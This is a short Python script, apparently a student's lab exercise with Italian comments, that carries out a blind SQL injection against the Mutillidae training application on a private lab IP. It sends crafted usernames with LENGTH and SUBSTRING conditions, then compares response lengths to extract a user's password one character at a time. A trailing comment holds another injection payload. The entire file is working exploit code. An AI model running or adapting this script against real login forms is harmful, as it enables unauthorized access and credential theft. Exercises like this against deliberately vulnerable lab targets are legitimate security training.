import requests
import string
alphabet = string.printable

print(alphabet)
print(len(alphabet))
url = "http://192.168.122.182/mutillidae/index.php?page=login.php" #cambiare l'ip con quello impostato dal dhcp

data = {
    'username': "john' AND LENGTH(password)=6 -- ",
    'password': "",
    'login-php-submit-button': "Login",
}

response = requests.post(url, data=data)
print("PRINTING RESPONSE INFO")
print("Status Code", response.status_code)
print("JSON Response ", len(response.text))

password_trovata = []

for i in range(1,9):

    for j in alphabet:

        data = {
        'username': f"simba' AND SUBSTRING(password,{i},1)='{j}' -- ",
        'password': "",
        'login-php-submit-button': "Login",
        }
        response = requests.post(url, data=data)
        if len(response.text) == 50095:
            print("ho indovinato il carattere ", j)
            password_trovata.append(j)
            break ## devi mettere questa, perché sennò mi continua a controllare anche le lettere maiuscole


print(password_trovata)

#simba' AND 6=(SELECT LENGTH(password) FROM accounts where username="simba" LIMIT 1) --
